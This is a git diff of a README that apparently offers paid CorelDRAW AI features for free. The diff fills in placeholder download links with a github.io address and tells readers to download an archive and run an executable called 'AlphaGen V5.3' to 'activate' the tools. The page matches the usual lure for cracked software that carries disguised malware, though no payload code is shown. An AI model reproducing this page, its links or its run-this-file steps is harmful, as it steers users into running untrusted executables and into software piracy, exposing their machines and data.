@@ -2,13 +2,13 @@
 
 Access exclusive AI-powered tools in CorelDRAW with a subscription — including image upsampling, smoothing, background removal, and content-aware features.
 
-[![Download](https://img.shields.io/badge/Download-Subscription_AI_Tools-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Subscription_AI_Tools-blueviolet)](https://subscription-ai-tools-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://subscription-ai-tools-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate AI tools access  
 4. ✅ Launch CorelDRAW and access tools under `Effects > AI Tools` (requires active subscription)
